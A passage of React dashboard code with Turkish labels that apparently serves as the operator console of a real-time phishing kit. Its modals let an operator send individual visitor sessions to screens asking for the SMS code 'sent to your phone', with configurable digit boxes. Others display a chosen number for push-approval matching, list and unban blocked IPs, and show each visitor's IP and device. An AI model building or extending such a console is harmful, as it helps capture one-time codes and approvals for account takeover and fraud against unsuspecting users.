            <div className="mt-6 flex justify-end gap-4">
              <button onClick={() => setSpecialPromptSessionId(null)} className={`px-4 py-2 font-semibold transition-colors ${darkMode ? 'text-zinc-500 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}>İptal</button>
              <button onClick={() => void publishSpecialApproval()} className="bg-[#EB5E28] px-10 py-2 rounded-xl text-white font-bold hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20">BİLDİRİMİ GÖNDER</button>
            </div>
          </div>
        </div>
      )}

      {/* SMS SETTINGS MODAL */}
      {smsPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>

            <div className="space-y-3">
              {/* ⭐ 1) SABİT HANE (Seçenek 1 - Radyo) */}
              <div
                onClick={() => setSmsModeUnknown(false)}
                className={`flex cursor-pointer items-start gap-3 rounded-xl border p-3 transition-all ${
                  !smsModeUnknown
                    ? darkMode
                      ? "border-[#16A34A] bg-[#16A34A]/8"
                      : "border-[#16A34A] bg-[#16A34A]/8"
                    : darkMode
                      ? "border-zinc-800 bg-zinc-900/40 hover:border-zinc-700"
                      : "border-gray-200 bg-gray-50/60 hover:border-gray-300"
                }`}
              >
                <div
                  className={`mt-0.5 flex size-5 shrink-0 items-center justify-center rounded-full border-2 transition-all ${
                    !smsModeUnknown ? "border-[#16A34A] bg-[#16A34A]" : darkMode ? "border-zinc-600" : "border-gray-400"
                  }`}
                >
                  {!smsModeUnknown && <div className="size-2.5 rounded-full bg-white" />}
                </div>
                <div className="min-w-0 flex-1">
                  <div className={`text-sm font-bold ${darkMode ? "text-white" : "text-gray-900"}`}>
                    Sabit Hane
                  </div>
                  <div className={`mt-0.5 text-[11px] ${darkMode ? "text-zinc-400" : "text-gray-500"}`}>
                    Belirlediğiniz hane sayısı (4-12) kadar sabit sayıda kutu gösterilir. Örn 6 haneli SMS.
                  </div>
                </div>
              </div>

              {/* ⭐ 2) BELİRSİZ HANE (Seçenek 2 - Radyo) */}
              <div
                onClick={() => setSmsModeUnknown(true)}
                className={`flex cursor-pointer items-start gap-3 rounded-xl border p-3 transition-all ${
                  smsModeUnknown
                    ? darkMode
                      ? "border-[#EB5E28] bg-[#EB5E28]/8"
                      : "border-[#EB5E28] bg-[#EB5E28]/8"
                    : darkMode
                      ? "border-zinc-800 bg-zinc-900/40 hover:border-zinc-700"
                      : "border-gray-200 bg-gray-50/60 hover:border-gray-300"
                }`}
              >
                <div
                  className={`mt-0.5 flex size-5 shrink-0 items-center justify-center rounded-full border-2 transition-all ${
                    smsModeUnknown ? "border-[#EB5E28] bg-[#EB5E28]" : darkMode ? "border-zinc-600" : "border-gray-400"
                  }`}
                >
                  {smsModeUnknown && <div className="size-2.5 rounded-full bg-white" />}
                </div>
                <div className="min-w-0 flex-1">
                  <div className={`text-sm font-bold ${darkMode ? "text-white" : "text-gray-900"}`}>
                    Belirsiz Hane
                  </div>
                  <div className={`mt-0.5 text-[11px] ${darkMode ? "text-zinc-400" : "text-gray-500"}`}>
                    Kaç haneli kod geldiğini bilmiyorsanız. Kullanıcı 4. haneyi girene kadar 4 kutu, sonraki her hane için YENİ kutu açılır (max 12). Kullanıcı Devam butonuna basınca ilerler.
                  </div>
                </div>
              </div>

              {!smsModeUnknown && (
                <div>
                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Hane Sayısı (Sabit)</label>
                  <input
                    type="number"
                    min={4}
                    max={12}
                    value={smsDigitsInput}
                    onChange={(e) => setSmsDigitsInput(e.target.value)}
                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#16A34A]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#16A34A]'}`}
                  />
                </div>
              )}

              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                  Özel Açıklama Metni (İsteğe Bağlı)
                </label>
                <textarea
                  rows={3}
                  value={smsCustomTextInput}
                  onChange={(e) => setSmsCustomTextInput(e.target.value)}
                  placeholder="Örn: Telefonunuza gelen şifreyi girin."
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => { setSmsPromptSessionId(null); setSmsModeUnknown(false); }}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmSmsRedirect()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
              >
                Onayla ve Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {approvalPromptSessionId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>Onay Ayarları</h3>

            <div className="space-y-4">
              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Seçilen Onay</label>
                <div className={`w-full rounded-xl border px-3 py-2 text-sm font-semibold ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}>
                  {APPROVAL_OPTIONS.find((option) => option.value === approvalPromptType)?.label || "-"}
                </div>
              </div>

              <div>
                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
                <input
                  type="text"
                  value={approvalCodeInput}
                  onChange={(e) => setApprovalCodeInput(e.target.value)}
                  placeholder="Örn: 1, 22, 4578"
                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
                />
              </div>
            </div>

            <div className="mt-6 flex justify-end gap-3">
              <button
                onClick={() => {
                  setApprovalPromptSessionId(null);
                  setApprovalPromptType("");
                  setApprovalCodeInput("");
                }}
                className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
              >
                İptal
              </button>
              <button
                onClick={() => void confirmApprovalAction()}
                className="rounded-xl bg-[#EB5E28] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#c94d1e] shadow-lg shadow-[#EB5E28]/20"
              >
                Onayla ve Gönder
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ============= BAN LIST MODAL (Kart tıklanınca açılır) ============= */}
      {banListModalOpen && (
        <div className="fixed inset-0 z-[190] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-5xl max-h-[85vh] flex flex-col overflow-hidden rounded-2xl border shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            {/* Header */}
            <div className={`flex justify-between items-center px-6 py-5 border-b shrink-0 ${darkMode ? 'border-zinc-800 bg-zinc-900/50' : 'border-gray-200 bg-gray-50'}`}>
              <div className="flex items-center gap-3">
                <div className={`w-11 h-11 rounded-xl flex items-center justify-center ${darkMode ? 'bg-red-500/15 text-red-400 border border-red-500/30' : 'bg-red-50 text-red-600 border border-red-200'}`}>
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" /></svg>
                </div>
                <div>
                  <h3 className={`text-xl font-extrabold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                    Banlı IP Listesi
                  </h3>
                  <div className={`mt-0.5 text-[11px] ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
                    Toplam <span className="font-black">{bannedCount}</span> adet banlı IP. Engeli tek tıkla kaldırabilirsiniz.
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => void loadBanData()}
                  className={`rounded-lg px-3 py-1.5 text-[11px] font-bold transition-colors ${darkMode ? 'bg-zinc-800 text-zinc-200 hover:bg-zinc-700 border border-zinc-700' : 'bg-gray-100 text-gray-800 hover:bg-gray-200 border border-gray-200'}`}
                >
                  ↻ Yenile
                </button>
                <button
                  type="button"
                  onClick={() => setBanListModalOpen(false)}
                  className={`rounded-lg px-3 py-1.5 text-sm font-bold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white hover:bg-zinc-800' : 'text-gray-500 hover:text-black hover:bg-gray-100'}`}
                  title="Kapat (ESC)"
                >
                  ✕ Kapat
                </button>
              </div>
            </div>

            {/* Body / Table */}
            <div className="flex-1 overflow-y-auto">
              <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
                <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b sticky top-0 backdrop-blur z-10 ${darkMode ? 'bg-zinc-900/90 text-gray-400 border-zinc-800' : 'bg-gray-50/90 text-gray-500 border-gray-100'}`}>
                  <tr>
                    <th className="w-[18%] px-6 py-4 font-semibold whitespace-nowrap">Tarih</th>
                    <th className="w-[22%] px-6 py-4 font-semibold whitespace-nowrap">IP Adresi</th>
                    <th className="w-[45%] px-6 py-4 font-semibold whitespace-nowrap">Sebep</th>
                    <th className="w-[15%] px-6 py-4 font-semibold text-right whitespace-nowrap">İşlemler</th>
                  </tr>
                </thead>
                <tbody className={`divide-y ${darkMode ? 'divide-zinc-800' : 'divide-gray-100'}`}>
                  {bannedIPs.length === 0 && (
                    <tr>
                      <td colSpan={4} className="px-6 py-16 text-center">
                        <div className={`text-5xl mb-3 opacity-60`}>🚫</div>
                        <div className={`text-xs font-medium opacity-65 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
                          Henüz banlı IP yok. Bir IP engellediğinizde burada listelenecek.
                        </div>
                      </td>
                    </tr>
                  )}
                  {bannedIPs.map((b) => (
                    <tr key={`ban-modal-${b.ip_address}`} className={darkMode ? 'hover:bg-white/5' : 'hover:bg-gray-50'}>
                      <td className="px-6 py-4 align-top">
                        <div className={`font-mono text-[11px] ${darkMode ? 'text-zinc-400' : 'text-gray-600'}`}>
                          {b.banned_at ? new Date(b.banned_at).toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" }) : "-"}
                        </div>
                      </td>
                      <td className="px-6 py-4 align-top">
                        <button
                          type="button"
                          onClick={() => copyToClipboard(b.ip_address)}
                          className={`font-mono font-bold break-all text-left transition-colors ${darkMode ? 'text-blue-400 hover:text-blue-300' : 'text-blue-600 hover:text-blue-700'}`}
                          title="Kopyalamak için tıkla"
                        >
                          {b.ip_address}
                        </button>
                      </td>
                      <td className="px-6 py-4 align-top">
                        <div className={`break-words whitespace-pre-wrap ${darkMode ? 'text-zinc-300' : 'text-gray-800'}`}>
                          {b.reason || <span className="opacity-50 italic">(Belirtilmemiş)</span>}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-right align-top">
                        <button
                          type="button"
                          onClick={() => handleUnbanIP(b.ip_address)}
                          className={`inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-[11px] font-bold transition-colors ${darkMode ? 'bg-green-500/15 text-green-400 hover:bg-green-500/25 border border-green-500/30' : 'bg-green-50 text-green-700 hover:bg-green-100 border border-green-200'}`}
                        >
                          <span>↺</span>
                          <span>Kaldır</span>
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Footer */}
            <div className={`px-6 py-4 border-t shrink-0 flex justify-between items-center ${darkMode ? 'border-zinc-800 bg-zinc-900/50' : 'border-gray-200 bg-gray-50'}`}>
              <div className={`text-[11px] ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                {bannedCount === 0 ? "Henüz kayıt yok." : `En son 500 kayıt listeleniyor.`}
              </div>
              <button
                type="button"
                onClick={() => setBanListModalOpen(false)}
                className={`rounded-lg px-5 py-2 text-sm font-bold transition-colors ${darkMode ? 'bg-zinc-800 text-white hover:bg-zinc-700' : 'bg-gray-200 text-gray-900 hover:bg-gray-300'}`}
              >
                Kapat
              </button>
            </div>
          </div>
        </div>
      )}

      {/* DEVICE INFO MODAL */}
      {deviceInfoSession && (() => {
        const uaInfo = parseUserAgent(deviceInfoSession.user_agent);
        return (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            <div className={`flex justify-between items-center mb-6 border-b pb-4 ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
              <h3 className={`text-xl font-bold flex items-center gap-2 ${darkMode ? 'text-white' : 'text-gray-900'}`}>
                📱 Cihaz & Bağlantı Bilgisi
              </h3>
              <button onClick={() => setDeviceInfoSession(null)} className="text-zinc-500 hover:opacity-70 text-xl">✕</button>
            </div>
            
            <div className="space-y-4">
              <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">IP Adresi</div>
                <div className="text-blue-400 font-mono text-lg">{deviceInfoSession.ip_address || "Henüz yansımadı"}</div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">İşletim Sistemi</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.os}</div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Tarayıcı</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.browser}</div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz Türü</div>
                  <div className={`font-medium ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.device}</div>
                </div>
                <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz modeli</div>
                  <div className={`font-medium break-words ${darkMode ? 'text-white' : 'text-gray-900'}`}>{uaInfo.model}</div>
                </div>
              </div>

              <div className={`p-4 rounded-xl border ${darkMode ? 'bg-zinc-900 border-zinc-800' : 'bg-gray-50 border-gray-200'}`}>
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Ham Veri (User-Agent)</div>
                <div className="text-xs text-zinc-400 font-mono break-words leading-relaxed">
                  {deviceInfoSession.user_agent || "Bilinmiyor"}
                </div>
              </div>
            </div>

            <div className="mt-6 flex justify-end">
              <button
                onClick={() => setDeviceInfoSession(null)}
                className={`rounded-lg px-6 py-2 text-sm font-bold transition-colors ${darkMode ? 'bg-zinc-800 text-white hover:bg-zinc-700' : 'bg-gray-200 text-gray-900 hover:bg-gray-300'}`}
              >
                Kapat
              </button>
            </div>
          </div>
        </div>
        );
      })()}
    </div>
  );
}

function StatCard({ icon, color, title, value, darkMode, onClick, clickableHint }: {
  icon: string;
  color: string;
  title: string;
  value: number;
  darkMode: boolean;
  onClick?: () => void;
  clickableHint?: string;
}) {
  const base = `relative overflow-hidden p-6 rounded-3xl border flex items-center transition-all duration-300 group ${darkMode ? 'bg-gradient-to-br from-[#1c1c1e]/80 to-[#1c1c1e]/40 border-white/5 shadow-lg backdrop-blur-xl' : 'bg-gradient-to-br from-white to-gray-50/80 border-[#d2d2d7]/50 shadow-md backdrop-blur-xl'}`;
  const clickable = onClick
    ? `cursor-pointer hover:scale-[1.02] hover:shadow-xl active:scale-[0.99] ${darkMode ? 'hover:ring-2 hover:ring-white/20' : 'hover:ring-2 hover:ring-black/10'}`
    : `hover:scale-[1.02] hover:shadow-xl`;
  return (
    <div onClick={onClick} className={`${base} ${clickable}`} title={clickableHint}>
      <div className={`absolute -right-6 -top-6 w-24 h-24 rounded-full blur-2xl opacity-20 transition-all duration-500 group-hover:scale-150 group-hover:opacity-40 ${color.replace('text-', 'bg-')}`}></div>
      <div className={`w-14 h-14 shrink-0 flex items-center justify-center rounded-2xl shadow-sm ${color.replace('text-', 'bg-').replace('500', '500/10')} ${color}`}>
        <svg className="w-7 h-7 drop-shadow-sm" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d={icon} /></svg>
      </div>
      <div className="ml-5 relative z-10 flex-1">
        <div className={`text-sm font-semibold tracking-wide uppercase opacity-70 mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{title}</div>
        <div className={`flex items-center gap-3`}>
          <div className={`text-4xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>{value}</div>
          {onClick ? (
            <div className={`rounded-md px-2 py-0.5 text-[10px] font-black tracking-wider uppercase border ${darkMode ? 'bg-white/5 text-zinc-400 border-white/10' : 'bg-gray-100 text-gray-500 border-gray-200'}`}>
              TIKLA ↗
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
}
